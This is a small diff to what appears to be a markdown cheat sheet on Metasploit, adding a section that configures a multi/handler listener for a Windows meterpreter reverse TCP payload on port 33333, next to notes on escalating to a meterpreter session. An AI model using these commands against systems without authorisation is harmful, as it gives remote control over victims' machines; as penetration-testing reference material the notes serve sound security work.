@@ -7,6 +7,15 @@ set LPORT, LHOST, RPORT, RHOST
 run
 ```
 
+## Basic meterpreter session
+
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LPORT 33333
+set LHOST 0.0.0.0
+```
+
 ## Escalate to the meterpreter session:
 
 ```
